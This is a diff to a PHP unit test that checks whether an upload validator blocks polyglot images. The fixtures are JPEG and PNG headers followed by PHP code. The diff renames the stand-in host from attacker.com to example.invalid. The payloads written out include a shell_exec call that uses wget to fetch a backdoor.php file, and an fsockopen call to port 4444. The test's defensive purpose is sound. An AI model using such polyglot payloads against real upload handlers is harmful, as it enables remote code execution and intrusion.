@@ -537,7 +537,7 @@ class MimeExtensionInferenceValidationTest extends TestCase
     public function testValidatorPluginMimeSpoofWithShellExecBlocked(): void
     {
         $polyglotContent = "\xFF\xD8\xFF" . str_repeat("\x00", 50)
-            . '<?php shell_exec("wget attacker.com/backdoor.php"); ?>';
+            . '<?php shell_exec("wget example.invalid/backdoor.php"); ?>';
         $base64 = base64_encode($polyglotContent);
 
         $imageContent = $this->createImageContentMock('53298390_0', 'image/jpeg', $base64);
@@ -572,7 +572,7 @@ class MimeExtensionInferenceValidationTest extends TestCase
     public function testValidatorPluginMimeSpoofWithFsockopenBlocked(): void
     {
         $polyglotContent = "\x89PNG\r\n\x1a\n" . str_repeat("\x00", 50)
-            . 'fsockopen("attacker.com", 4444)';
+            . 'fsockopen("example.invalid", 4444)';
         $base64 = base64_encode($polyglotContent);
 
         $imageContent = $this->createImageContentMock('banner', 'image/png', $base64);
